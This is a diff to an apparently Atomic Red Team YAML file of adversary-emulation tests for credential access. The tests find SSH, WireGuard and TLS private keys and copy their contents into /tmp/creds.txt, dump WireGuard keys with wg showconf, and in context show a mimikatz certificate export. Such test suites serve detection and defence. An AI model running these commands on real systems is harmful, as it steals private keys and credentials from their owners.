@@ -25,16 +25,20 @@ atomic_tests:
       description: Path where to start searching from.
       type: path
       default: /
-    output_file:
-      description: Output file containing locations of SSH key files
-      type: path
-      default: /tmp/keyfile_locations.txt
+    filename:
+      description: SSH Key file to search for
+      type: string
+      default: id_rsa
+    optional_flags:
+      description: optional flags passed into find that should be ran
+      type: string
+      default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt' _ {} \;
   executor:
     command: |
-      find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}
+      find #{search_path} -name "#{filename}" -type f #{optional_flags} 2>/dev/null
       exit 0
     cleanup_command: |
-      rm #{output_file}
+      rm -f /tmp/creds.txt
     name: sh
 - name: Copy Private SSH Keys with CP
   auto_generated_guid: 7c247dc7-5128-4643-907b-73a76d9135c3
@@ -399,3 +403,69 @@ atomic_tests:
       "#{mimikatz_exe}" "crypto::certificates /systemstore:local_machine /store:my /export"  exit
     name: command_prompt
     elevation_required: true
+- name: Enumerate WireGuard interface credentials with wg showconf
+  auto_generated_guid: e7568442-1b7d-4380-a933-b269d1326b6c
+  description: |
+    Dump WireGuard interface configurations including private keys and preshared keys using wg showconf. Requires root privileges.
+  supported_platforms:
+  - linux
+  dependency_executor_name: sh
+  dependencies:
+  - description: |
+      wireguard-tools must be installed
+    prereq_command: |
+      which wg
+    get_prereq_command: |
+      (apt-get install -y wireguard-tools || dnf install -y wireguard-tools || yum install -y wireguard-tools || pacman -S --noconfirm wireguard-tools) && touch /tmp/wireguard_installed
+  executor:
+    command: |
+      for iface in $(wg show interfaces); do wg showconf "$iface"; done
+    cleanup_command: |
+      if [ -f /tmp/wireguard_installed ]; then (apt-get remove -y wireguard-tools || dnf remove -y wireguard-tools || yum remove -y wireguard-tools || pacman -R --noconfirm wireguard-tools) && rm -f /tmp/wireguard_installed; fi
+    name: sh
+    elevation_required: true
+- name: Find WireGuard configuration files
+  auto_generated_guid: 42c55554-3dcb-4df6-8fbb-c8ccacc478d4
+  description: |
+    Find WireGuard configuration files in /etc/wireguard/, which contain private keys and preshared keys in plaintext. Requires root privileges.
+  supported_platforms:
+  - linux
+  input_arguments:
+    optional_flags:
+      description: optional flags passed into find that should be ran
+      type: string
+      default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt' _ {} \;
+  executor:
+    command: |
+      find /etc/wireguard -name '*.conf' -type f #{optional_flags} 2>/dev/null
+    cleanup_command: |
+      rm -f /tmp/creds.txt
+    name: sh
+    elevation_required: true
+- name: Find TLS private key files
+  auto_generated_guid: 5e417277-0ae7-4ad5-a3e8-0fa27c122b29
+  description: |
+    Find TLS private key files on the filesystem by extension.
+    Extensions include *.key, *.pem, *.p12, and *.pfx
+  supported_platforms:
+  - linux
+  - macos
+  input_arguments:
+    file_path:
+      description: Path to search
+      type: string
+      default: /
+    file_extensions:
+      description: Space-separated TLS key file extensions to search for
+      type: string
+      default: '*.key *.pem *.p12 *.pfx'
+    optional_flags:
+      description: optional flags passed into find that should be ran
+      type: string
+      default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt' _ {} \;
+  executor:
+    command: |
+      for file_extension in #{file_extensions}; do find #{file_path} -name "$file_extension" -type f #{optional_flags} 2>/dev/null; done
+    cleanup_command: |
+      rm -f /tmp/creds.txt
+    name: sh
